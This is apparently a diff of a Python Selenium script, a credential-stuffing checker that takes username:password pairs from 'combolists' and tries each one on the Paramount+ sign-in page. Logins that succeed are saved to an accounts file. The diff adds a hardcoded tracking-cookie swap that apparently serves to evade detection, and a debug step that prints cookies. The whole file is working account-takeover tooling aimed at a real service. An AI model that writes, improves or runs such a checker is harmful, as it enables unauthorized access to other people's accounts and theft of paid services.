@@ -1,4 +1,5 @@
 import time
+import os
 
 from combo_splitters.split_combos import ComboSplitter
 from selenium import webdriver
@@ -13,7 +14,7 @@ from pathlib import Path
 
 def paramount_():
 	title()
-	file_directory = str(Path(__file__).parents[1])+'/combolists/paramount'
+	file_directory = str(Path(__file__).parents[1])+'/combolists/combos/paramount'
 	plain_directory = str(Path(__file__).parents[1])
 	ip_country()
 	page = 'https://www.paramountplus.com/account/signin/'
@@ -21,20 +22,27 @@ def paramount_():
 	try:
 		users, passwords = splitter.split_file()
 	except TypeError:
-		splitter.return_error()
+		splitter.return_error(plain_directory + "/combolists")
 		exit()
 	index = 0
 	browser_options = Options()
 	browser_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')
-	browser_options.add_argument('--headless=new')
+	#browser_options.add_argument('--headless=new')
 	while index < len(users):
+		os.makedirs(plain_directory + "/accounts", exist_ok=True)
 		with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
 			try:
 				print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
 				browser = webdriver.Chrome(options=browser_options)
 				browser.set_window_size(500, 700)
 				browser.get(page)
-				browser.add_cookie({'name': 'ovvuid', 'value': 'bb7470a9-4e85-4863-b551-8667ea62be6c'})
+				cookies = browser.get_cookies()
+				print(cookies)
+				exit()
+				# a6121399-6ef9-447e-8653-8e223168a398 💀 Jacob the Robber!
+				# 9f064779-4c06-49f1-9cdd-7e64e653145e
+				# bb7470a9-4e85-4863-b551-8667ea62be6c
+				browser.add_cookie({'name': 'ovvuid', 'value': 'a6121399-6ef9-447e-8653-8e223168a398'})
 				browser.set_page_load_timeout(10)
 				email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
 				password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
@@ -65,7 +73,7 @@ def paramount_():
 				browser.close()
 				index += 1
 			except (ElementClickInterceptedException, NoSuchElementException):
-				print(' -- Error: Intercepted')
+				print(' -- Error: Click Intercepted')
 				browser.close()
 			except TimeoutException:
 				print(' -- Timed out. Index not incremented.')
